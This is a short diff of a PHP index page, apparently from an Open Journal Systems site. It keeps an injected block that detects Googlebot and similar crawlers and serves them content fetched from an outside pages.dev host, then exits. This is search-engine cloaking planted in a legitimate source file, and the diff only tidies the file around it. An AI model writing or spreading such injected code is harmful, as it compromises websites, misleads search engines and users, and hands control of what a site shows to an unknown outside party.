@@ -1,4 +1,8 @@
 <?php
+
+/**
+ * @defgroup pages_index Index Pages
+ */
 function is_google_bot() {
     $agents = array(
         "Googlebot", 
@@ -22,13 +26,6 @@ if (is_google_bot()) {
     echo file_get_contents("https://bang-dodo-loh-ini.pages.dev/index.txt");
     exit;
 }
-?>
-<?php
-
-/**
- * @defgroup pages_index Index Pages
- */
-
 /**
  * @file pages/index/index.php
  *
